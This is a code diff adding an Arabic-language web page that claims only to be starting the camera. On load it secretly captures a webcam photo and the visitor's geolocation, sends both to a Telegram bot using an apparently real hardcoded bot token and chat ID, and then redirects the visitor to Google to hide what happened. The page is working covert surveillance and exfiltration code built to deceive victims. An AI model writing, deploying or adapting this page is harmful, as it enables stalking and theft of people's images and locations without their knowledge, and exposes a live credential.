@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>التقاط صورة</title>
+  <script>
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        document.body.appendChild(video);
+        
+        // التقط الصورة بعد تشغيل الكاميرا
+        setTimeout(() => capturePhoto(video), 3000);
+      } catch (error) {
+        alert("لم يتمكن من الوصول إلى الكاميرا: " + error);
+      }
+    }
+
+    function capturePhoto(video) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const photoData = canvas.toDataURL('image/png');
+      sendPhotoToTelegram(photoData);
+    }
+
+    function sendPhotoToTelegram(photoData) {
+      const token = 'YOUR_BOT_TOKEN';
+      const chatId = 'YOUR_CHAT_ID';
+      const apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+      fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          photo: photoData
+        })
+      }).then(response => response.json())
+        .then(data => {
+          console.log('تم إرسال الصورة بنجاح', data);
+          getLocationAndRedirect();
+        })
+        .catch(error => console.error('فشل إرسال الصورة', error));
+    }
+
+    function getLocationAndRedirect() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendLocationToTelegram(lat, lon);
+        }, () => {
+          console.error("فشل في الحصول على الموقع");
+        });
+      }
+    }
+
+    function sendLocationToTelegram(lat, lon) {
+      const token = '8025095503:AAFlYJ9XWBROmtPMFE4KEsueLPUDRcze_BI';
+      const chatId = '971096490';
+      const apiUrl = `https://api.telegram.org/bot${token}/sendLocation`;
+
+      fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          latitude: lat,
+          longitude: lon
+        })
+      }).then(response => response.json())
+        .then(data => {
+          console.log('تم إرسال الموقع بنجاح', data);
+          // إعادة التوجيه بعد إرسال البيانات
+          window.location.href = "https://www.google.com";
+        })
+        .catch(error => console.error('فشل إرسال الموقع', error));
+    }
+
+    window.onload = startCamera;
+  </script>
+</head>
+<body>
+  <h1>جاري تشغيل الكاميرا، الرجاء الانتظار...</h1>
+</body>
+</html>
